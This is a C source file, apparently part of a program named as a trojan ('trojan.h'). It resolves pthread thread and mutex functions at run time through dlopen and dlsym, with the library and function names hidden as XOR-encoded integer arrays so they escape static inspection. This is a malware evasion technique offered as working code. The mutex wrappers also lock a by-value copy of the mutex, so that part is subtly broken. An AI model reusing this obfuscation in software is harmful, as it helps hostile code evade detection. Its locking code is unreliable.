#include "trojan.h"

// https://stackoverflow.com/questions/31526876/casting-when-using-dlsym
// https://stackoverflow.com/questions/34840510/how-to-replace-pthread-create-during-linkage

static create_type create = NULL;
static detach_type detach = NULL;
static lock_type lock = NULL;
static unlock_type unlock = NULL;

void load(int mod) {
    int file[15] = {70, 67, 72, 90, 94, 66, 88, 79, 75, 78, 4, 89, 69, 4, 26};
    int create_name[14] = {90, 94, 66, 88, 79, 75, 78, 117, 73, 88, 79, 75, 94, 79};
    int detach_name[14] = {90, 94, 66, 88, 79, 75, 78, 117, 78, 79, 94, 75, 73, 66};

    char decoded[50];
    decode(file, decoded, 42, 15);

    void *handle = dlopen(decoded, RTLD_LAZY); // grep: /lib/x86_64-linux-gnu/libpthread.so.0: binary file matches

    if (mod == CREATE) {
        decode(create_name, decoded, 42, 14);
        create = (create_type)dlsym(handle, decoded);
    }
    else if (mod == DETACH) {
        decode(detach_name, decoded, 42, 14);
        detach = (detach_type)dlsym(handle, decoded);
    } else if (mod == MLOCK) {
        lock = (lock_type)dlsym(handle, "pthread_mutex_lock");
    } else {
        unlock = (unlock_type)dlsym(handle, "pthread_mutex_unlock");
    }
    dlclose(handle);
}

int p_create(CREATE_ARGS) {
    if (create == NULL) {
        load(CREATE);
    }
    int ret = create(thread, attr, start_routine, arg);
    return ret;
}

int p_detach(pthread_t id) {
    if (detach == NULL) {
        load(DETACH);
    }
    int ret = detach(id);

    return ret;
}

int m_lock(pthread_mutex_t mutex) {
    if (lock == NULL) {
        load(MLOCK);
    }

    int ret = lock(&mutex);

    return ret;
}

int m_unlock(pthread_mutex_t mutex) {
    if (unlock == NULL) {
        load(MUNLOCK);
    }
    int ret = unlock(&mutex);

    return ret;
}